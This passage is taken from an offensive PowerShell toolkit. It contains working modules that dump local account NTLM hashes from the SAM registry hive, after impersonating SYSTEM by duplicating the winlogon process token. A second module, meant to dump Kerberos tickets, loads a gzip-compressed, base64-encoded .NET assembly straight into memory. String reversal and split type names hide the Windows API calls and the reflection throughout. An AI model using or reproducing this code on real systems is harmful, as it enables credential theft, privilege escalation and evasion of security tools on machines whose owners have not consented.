            $handleRefOverload = $systemType.GetMethod($X3, [System.Reflection.BindingFlags] "Public,Static", $null, [System.Type[]] @([System.Runtime.InteropServices.HandleRef], [System.String]), $null)

            if (!$handleRefOverload) { throw "Could not find a suitable GetProcAddress overload on this system." }

            $moduleHandle = $systemType.GetMethod($X4).Invoke($null, @($moduleName))
            $handleRef = New-Object System.Runtime.InteropServices.HandleRef($null, $moduleHandle)
            return $handleRefOverload.Invoke($null, @($handleRef, $functionName))
        }
    }

    function Invoke-GetDelegate {
        Param (
            [Parameter(Position = 0, Mandatory = $true)] 
            [Type[]] $parameterTypes,
            [Parameter(Position = 1, Mandatory = $false)] 
            [Type] $returnType = [Void]
        )
    
        $assemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
            (New-Object System.Reflection.AssemblyName($N1)),
            [System.Reflection.Emit.AssemblyBuilderAccess]::Run
        )
    
        $moduleBuilder = $assemblyBuilder.DefineDynamicModule($N2, $false)
    
        $typeBuilder = $moduleBuilder.DefineType(
            $N3, 
            [System.Reflection.TypeAttributes]::Class -bor 
            [System.Reflection.TypeAttributes]::Public -bor 
            [System.Reflection.TypeAttributes]::Sealed -bor 
            [System.Reflection.TypeAttributes]::AnsiClass -bor 
            [System.Reflection.TypeAttributes]::AutoClass, 
            [System.MulticastDelegate]
        )
    
        $constructorBuilder = $typeBuilder.DefineConstructor(
            [System.Reflection.MethodAttributes]::RTSpecialName -bor 
            [System.Reflection.MethodAttributes]::HideBySig -bor 
            [System.Reflection.MethodAttributes]::Public,
            [System.Reflection.CallingConventions]::Standard,
            $parameterTypes
        )
    
        $constructorBuilder.SetImplementationFlags(
            [System.Reflection.MethodImplAttributes]::Runtime -bor 
            [System.Reflection.MethodImplAttributes]::Managed
        )
    
        $methodBuilder = $typeBuilder.DefineMethod(
            'Invoke',
            [System.Reflection.MethodAttributes]::Public -bor 
            [System.Reflection.MethodAttributes]::HideBySig -bor 
            [System.Reflection.MethodAttributes]::NewSlot -bor 
            [System.Reflection.MethodAttributes]::Virtual,
            $returnType,
            $parameterTypes
        )
    
        $methodBuilder.SetImplementationFlags(
            [System.Reflection.MethodImplAttributes]::Runtime -bor 
            [System.Reflection.MethodImplAttributes]::Managed
        )
    
        return $typeBuilder.CreateType()
    }

    $X1 = ([regex]::Matches("lld.metsyS", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
    $X2 = ([regex]::Matches("sdohteMevitaNefasnU.23niW.tfosorciM", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
    $X3 = ([regex]::Matches("sserddAcorPteG", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
    $X4 = ([regex]::Matches("eldnaHeludoMteG", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''

    $N1 = ([regex]::Matches("etageleDdetcelfeR", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
    $N2 = ([regex]::Matches("eludoMyromeMnI", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
    $N3 = ([regex]::Matches("epyTetageleDyM", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''

    $F1 = ([regex]::Matches("ssecorPnepO", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
    $F2 = ([regex]::Matches("nekoTssecorPnepO", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
    $F3 = ([regex]::Matches("xEnekoTetacilpuD", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
    $F4 = ([regex]::Matches("resUnOdeggoLetanosrepmI", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''

    $F5 = ([regex]::Matches("AxEyeKnepOgeR", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
    $F7 = ([regex]::Matches("AyeKofnIyreuQgeR", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
    $F8 = ([regex]::Matches("yeKesolCgeR", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''

    $A1 = ([regex]::Matches("lld.23lenreK", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
    $A2 = ([regex]::Matches("lld.23ipavdA", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''

    $FnOpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName $A1 -functionName $F1), (Invoke-GetDelegate @([UInt32], [bool], [UInt32]) ([IntPtr])));
    $FnOpenProcessToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName $A2 -functionName $F2), (Invoke-GetDelegate @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) ([bool])));
    $FnDuplicateTokenEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName $A2 -functionName $F3), (Invoke-GetDelegate @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32], [IntPtr].MakeByRefType()) ([bool])));
    $FnImpersonateLoggedOnUser = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName $A2 -functionName $F4), (Invoke-GetDelegate @([IntPtr]) ([bool])));

    $FnRegOpenKeyEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName $A2 -functionName $F5), (Invoke-GetDelegate @([Int32], [String], [Int32], [Int32], [IntPtr].MakeByRefType()) ([Int32])));
    $FnRegQueryInfoKey = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName $A2 -functionName $F7), (Invoke-GetDelegate @([Int32], [Text.StringBuilder], [Int32].MakeByRefType(), [Int32], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType(), [IntPtr]) ([Int32])));
    $FnRegCloseKey = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName $A2 -functionName $F8), (Invoke-GetDelegate @([Int32]) ([Int32])));

        function Invoke-Impersonate {

    $CurrentUserSid = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value    
    if ($currentUserSid -eq "S-1-5-18") { return }
    
    $P1 = "Wi" + "N"
    $P2 = "lO" + "gO" + "n"
    $P3 = $P1 + $P2
    $wlgProcessId = (Get-Process $P3 | Select-Object -First 1 -ExpandProperty Id)
    $wlgProcHandle = $FnOpenProcess.Invoke(0x400, $true, [Int32]$wlgProcessId)
    if ($wlgProcHandle -eq [IntPtr]::Zero) { return $false }
    
    $wlgProcTokenHandle = [IntPtr]::Zero
    if (-not $FnOpenProcessToken.Invoke($wlgProcHandle, 0x0E, [ref]$wlgProcTokenHandle)) { return $false }
    
    $dupTokenHandle = [IntPtr]::Zero
    if (-not $FnDuplicateTokenEx.Invoke($wlgProcTokenHandle, 0x02000000, [IntPtr]::Zero, 0x02, 0x01, [ref]$dupTokenHandle)) { return $false }
    
    try {
        
        if (-not $FnImpersonateLoggedOnUser.Invoke($dupTokenHandle)) { return $false }
        if ($currentUserSid -eq "S-1-5-18") { return } else { return $false }
    
        }
    
    catch { return $false }
    
    return $false
}

    function Get-NTLM {
        Get-ChildItem "HKLM:SAM\SAM\Domains\Account\Users" |
        Where-Object { $_.PSChildName -match "^[0-9A-F]{8}$" } |
        ForEach-Object {
            $rid = $_.PSChildName
            $valueV = (Get-ItemProperty "HKLM:SAM\SAM\Domains\Account\Users\$rid" -Name V).V
            $valueF = (Get-ItemProperty "HKLM:SAM\SAM\Domains\Account" -Name F).F
    
            $collected = -join (& {
                    "JD", "Skew1", "GBG", "Data" | ForEach-Object {
                        $regHandle = [IntPtr]::Zero
                        if ($fnRegOpenKeyEx.Invoke(0x80000002, "SYSTEM\CurrentControlSet\Control\Lsa\$_", 0x0, 0x19, [ref]$regHandle)) {
                            $regError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                            throw [ComponentModel.Win32Exception]$regError
                        }
    
                        $classBuilder = New-Object Text.StringBuilder 1024
                        [int]$classLen = 1024
                        if ($fnRegQueryInfoKey.Invoke(
                                $regHandle,
                                $classBuilder,
                                [ref]$classLen,
                                0x0,
                                [ref]$null,
                                [ref]$null,
                                [ref]$null,
                                [ref]$null,
                                [ref]$null,
                                [ref]$null,
                                [ref]$null,
                                [IntPtr]::Zero
                            )) {
                            $regError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                            throw [ComponentModel.Win32Exception]$regError
                        }
    
                        [void] $fnRegCloseKey.Invoke($regHandle)
                        $classBuilder.ToString()
                    }
                })
    
            $calcMd5 = [Security.Cryptography.MD5]::Create()
    
            $cipherAes = [Security.Cryptography.Aes]::Create()
            $cipherAes.Mode = [Security.Cryptography.CipherMode]::CBC
            $cipherAes.Padding = [Security.Cryptography.PaddingMode]::None
            $cipherAes.KeySize = 128
    
            $cipherDes = [Security.Cryptography.DES]::Create()
            $cipherDes.Mode = [Security.Cryptography.CipherMode]::ECB
            $cipherDes.Padding = [Security.Cryptography.PaddingMode]::None
    
            $calcOffset = [BitConverter]::ToInt32($valueV, 0x0C) + 0xCC
    
            $calcLen = [BitConverter]::ToInt32($valueV, 0x10)
            $username = [Text.Encoding]::Unicode.GetString($valueV, $calcOffset, $calcLen)
    
            $calcOffset = [BitConverter]::ToInt32($valueV, 0xA8) + 0xCC
            $masterKey = 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 | ForEach-Object { [Convert]::ToByte("$($collected[$_*2])$($collected[$_*2+1])", 16) }
    
            switch ($valueV[0xAC]) {
                0x38 {
                    $encSysKey = $valueF[0x88..0x97]
                    $encSysKeyIv = $valueF[0x78..0x87]
                    $encSysKeyKey = $masterKey
    
                    $finalSysKey = $cipherAes.CreateDecryptor($encSysKeyKey, $encSysKeyIv).
                    TransformFinalBlock($encSysKey, 0, 16)
    
                    $encNtlmVal = $valueV[($calcOffset + 24)..($calcOffset + 24 + 0x0F)]
                    $encNtlmIv = $valueV[($calcOffset + 8)..($calcOffset + 23)]
                    $encNtlmKey = $finalSysKey
    
                    $encNtlmVal = $cipherAes.CreateDecryptor($encNtlmKey, $encNtlmIv).
                    TransformFinalBlock($encNtlmVal, 0, 16)
                }
    
                0x14 {
                    $encSysKey = $valueF[0x80..0x8f]
                    $encSysKeyKey = $calcMd5.ComputeHash(
                        $valueF[0x70..0x7f] +
                        [Text.Encoding]::ASCII.GetBytes("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%`0") +
                        $masterKey +
                        [Text.Encoding]::ASCII.GetBytes("0123456789012345678901234567890123456789`0")
                    )
    
                    $finalSysKey = rc4_cipher $encSysKey $encSysKeyKey
    
                    $encNtlmVal = $valueV[($calcOffset + 4)..($calcOffset + 4 + 0x0F)]
                    $encNtlmKey = $calcMd5.ComputeHash(
                        $finalSysKey +
                        (3, 2, 1, 0 | ForEach-Object {
                            [Convert]::ToByte("$($rid[$_*2])$($rid[$_*2+1])", 16)
                        }) +
                        [Text.Encoding]::ASCII.GetBytes("NTPASSWORD`0")
                    )
    
                    $encNtlmVal = rc4_cipher $encNtlmVal $encNtlmKey
                }
    
                default {
                    
                    if ($Username -eq "Guest" -or ($Username -eq "WDAGUtilityAccount" -or ($Username -eq "DefaultAccount"))){ return }
                    
                    $rid = [int]"0x$rid"
                    return "$username`:$rid`:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::"
                }
            }
    
            $desArray1 = 3, 2, 1, 0, 3, 2, 1 | ForEach-Object { [Convert]::ToByte("$($rid[$_*2])$($rid[$_*2+1])", 16) }
            $desArray2 = 0, 3, 2, 1, 0, 3, 2 | ForEach-Object { [Convert]::ToByte("$($rid[$_*2])$($rid[$_*2+1])", 16) }
            $desKey1 = string2Key($desArray1)
            $desKey2 = string2Key($desArray2)
    
            $ntlmPart1 = $cipherDes.CreateDecryptor($desKey1, $desKey1).TransformFinalBlock($encNtlmVal, 0, 8)
            $ntlmPart2 = $cipherDes.CreateDecryptor($desKey2, $desKey2).TransformFinalBlock($encNtlmVal, 8, 8)
    
            $ntlm = [BitConverter]::ToString($ntlmPart1 + $ntlmPart2) -split '-' -join ''
    
            if ($Username -eq "WDAGUtilityAccount") { return }

            $rid = [int]"0x$rid"
            "$username`:$rid`:aad3b435b51404eeaad3b435b51404ee:$($ntlm.Substring(0, 32).ToLower()):$($ntlm.Substring(32).ToLower())::"
        }
    }
    
    function rc4_cipher($data, $index) {
        $result = $data
        $state = New-Object Byte[] 256
        $keyBytes = New-Object Byte[] 256

        for ($outer = 0; $outer -lt 256; $outer++) {
            $state[$outer] = [byte]$outer
            $keyBytes[$outer] = $index[$outer % $index.Length]
        }

        $inner = 0
        for ($outer = 0; $outer -lt 256; $outer++) {
            $inner = ($inner + $state[$outer] + $keyBytes[$outer]) % 256
            $swapVal = $state[$outer]
            $state[$outer] = $state[$inner]
            $state[$inner] = $swapVal
        }

        $outer = $inner = 0
        for ($pos = 0; $pos -lt $result.Length; $pos++) {
            $outer = ($outer + 1) % 256
            $inner = ($inner + $state[$outer]) % 256
            $swapVal = $state[$outer]
            $state[$outer] = $state[$inner]
            $state[$inner] = $swapVal
            [int]$combined = ($state[$outer] + $state[$inner]) % 256
            $result[$pos] = $result[$pos] -bxor $state[$combined]
        }
        return $result
    }


    function string2Key($i) {
        $Parity = @(1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14, 16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31, 32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47, 49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62, 64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79, 81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94, 97, 97, 98, 98, 100, 100, 103, 103, 104, 104, 107, 107, 109, 109, 110, 110, 112, 112, 115, 115, 117, 117, 118, 118, 121, 121, 122, 122, 124, 124, 127, 127, 128, 128, 131, 131, 133, 133, 134, 134, 137, 137, 138, 138, 140, 140, 143, 143, 145, 145, 146, 146, 148, 148, 151, 151, 152, 152, 155, 155, 157, 157, 158, 158, 161, 161, 162, 162, 164, 164, 167, 167, 168, 168, 171, 171, 173, 173, 174, 174, 176, 176, 179, 179, 181, 181, 182, 182, 185, 185, 186, 186, 188, 188, 191, 191, 193, 193, 194, 194, 196, 196, 199, 199, 200, 200, 203, 203, 205, 205, 206, 206, 208, 208, 211, 211, 213, 213, 214, 214, 217, 217, 218, 218, 220, 220, 223, 223, 224, 224, 227, 227, 229, 229, 230, 230, 233, 233, 234, 234, 236, 236, 239, 239, 241, 241, 242, 242, 244, 244, 247, 247, 248, 248, 251, 251, 253, 253, 254, 254)
    
        $index = @()
        $index += shift-bits $i[0] -1
        $index += (shift-bits ($i[0] -band 0x01) 6) -bor (shift-bits $i[1] -2)
        $index += (shift-bits ($i[1] -band 0x03) 5) -bor (shift-bits $i[2] -3)
        $index += (shift-bits ($i[2] -band 0x07) 4) -bor (shift-bits $i[3] -4)
        $index += (shift-bits ($i[3] -band 0x0F) 3) -bor (shift-bits $i[4] -5)
        $index += (shift-bits ($i[4] -band 0x1F) 2) -bor (shift-bits $i[5] -6)
        $index += (shift-bits ($i[5] -band 0x3F) 1) -bor (shift-bits $i[6] -7)
        $index += $i[6] -band 0x7F
        $index[0] = $Parity[(shift-bits $index[0] 1)]
        $index[1] = $Parity[(shift-bits $index[1] 1)]
        $index[2] = $Parity[(shift-bits $index[2] 1)]
        $index[3] = $Parity[(shift-bits $index[3] 1)]
        $index[4] = $Parity[(shift-bits $index[4] 1)]
        $index[5] = $Parity[(shift-bits $index[5] 1)]
        $index[6] = $Parity[(shift-bits $index[6] 1)]
        $index[7] = $Parity[(shift-bits $index[7] 1)]
        $index
    }

    function shift-bits($x, $c) { return [math]::Floor($x * [math]::Pow(2, $c)) }

    Invoke-Impersonate > $null
    Get-NTLM
} Invoke-DumpSAM
'@

################################################################################################################
####################################### Module: KerbDump #######################################################
################################################################################################################

# Highly compressed revision of this script: https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Kirby.ps1
$Global:LocalKerbDump = @'
Function Invoke-DumpKerberos {
    param ([Switch]$TGT, [Int]$Monitor)
    
    $ntAuthorityRegexPattern = "NT.AUT.*\\"
    
    if ($Loaded -ne 1) {
        $Data = ([regex]::Matches("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", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
        $d = [System.Convert]::FromBase64String($Data)
        $c = New-Object System.IO.MemoryStream(, $d)
        $o = New-Object System.IO.MemoryStream
        $g = New-Object System.IO.Compression.GZipStream($c, [IO.Compression.CompressionMode]::Decompress)
        $g.CopyTo($o)
        $o.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
        $a = $o.ToArray()
        $FbG =[TypE]('SySteM.r'+'eFl'+'eCtio'+'N'+'.'+'aS'+'SemBLY') ;if (  (VaRiaBlE ('f'+'bG') -va  )::Load($a)) { $Loaded = 1 }
    
    }
    
    function Invoke-FunctionLookup {
            Param (
            [Parameter(Position = 0, Mandatory = $true)] 
            [string] $moduleName,

            [Parameter(Position = 1, Mandatory = $true)] 
            [string] $functionName
        )

    $systemType = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1] -eq $X1 }).GetType($X2)
    $PtrOverload = $systemType.GetMethod($X3, [System.Reflection.BindingFlags] "Public,Static", $null, [System.Type[]] @([System.IntPtr], [System.String]), $null)

    if ($PtrOverload) {

        $moduleHandle = $systemType.GetMethod($X4).Invoke($null, @($moduleName))
        return $PtrOverload.Invoke($null, @($moduleHandle, $functionName))
    }
    else {
        $handleRefOverload = $systemType.GetMethod($X3, [System.Reflection.BindingFlags] "Public,Static", $null, [System.Type[]] @([System.Runtime.InteropServices.HandleRef], [System.String]), $null)

        if (!$handleRefOverload) { throw "Could not find a suitable GetProcAddress overload on this system." }

        $moduleHandle = $systemType.GetMethod($X4).Invoke($null, @($moduleName))
        $handleRef = New-Object System.Runtime.InteropServices.HandleRef($null, $moduleHandle)
        return $handleRefOverload.Invoke($null, @($handleRef, $functionName))
    }
}

    function Invoke-GetDelegate {
        Param (
            [Parameter(Position = 0, Mandatory = $true)] 
            [Type[]] $parameterTypes,

            [Parameter(Position = 1, Mandatory = $false)] 
            [Type] $returnType = [Void]
        )

        $assemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
         (New-Object System.Reflection.AssemblyName($N1)),
            [System.Reflection.Emit.AssemblyBuilderAccess]::Run
        )

        $moduleBuilder = $assemblyBuilder.DefineDynamicModule($N2, $false)

        $typeBuilder = $moduleBuilder.DefineType(
            $N3, 
            [System.Reflection.TypeAttributes]::Class -bor 
            [System.Reflection.TypeAttributes]::Public -bor 
            [System.Reflection.TypeAttributes]::Sealed -bor 
            [System.Reflection.TypeAttributes]::AnsiClass -bor 
            [System.Reflection.TypeAttributes]::AutoClass, 
            [System.MulticastDelegate]
        )

        $constructorBuilder = $typeBuilder.DefineConstructor(
            [System.Reflection.MethodAttributes]::RTSpecialName -bor 
            [System.Reflection.MethodAttributes]::HideBySig -bor 
            [System.Reflection.MethodAttributes]::Public,
            [System.Reflection.CallingConventions]::Standard,
            $parameterTypes
        )

        $constructorBuilder.SetImplementationFlags(
            [System.Reflection.MethodImplAttributes]::Runtime -bor 
            [System.Reflection.MethodImplAttributes]::Managed
        )

        $methodBuilder = $typeBuilder.DefineMethod(
            'Invoke',
            [System.Reflection.MethodAttributes]::Public -bor 
            [System.Reflection.MethodAttributes]::HideBySig -bor 
            [System.Reflection.MethodAttributes]::NewSlot -bor 
            [System.Reflection.MethodAttributes]::Virtual,
            $returnType,
            $parameterTypes
        )

        $methodBuilder.SetImplementationFlags(
            [System.Reflection.MethodImplAttributes]::Runtime -bor 
            [System.Reflection.MethodImplAttributes]::Managed
        )

        return $typeBuilder.CreateType()
    }


    $X1 = ([regex]::Matches("lld.metsyS", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
    $X2 = ([regex]::Matches("sdohteMevitaNefasnU.23niW.tfosorciM", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
    $X3 = ([regex]::Matches("sserddAcorPteG", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
    $X4 = ([regex]::Matches("eldnaHeludoMteG", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''

    $N1 = ([regex]::Matches("etageleDdetcelfeR", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
    $N2 = ([regex]::Matches("eludoMyromeMnI", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
    $N3 = ([regex]::Matches("epyTetageleDyM", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''

    $dF1 = ([regex]::Matches("egakcaPnoitacitnehtuApukooLasL", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
    $dF2 = ([regex]::Matches("ssecorPnogoLretsigeRasL", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
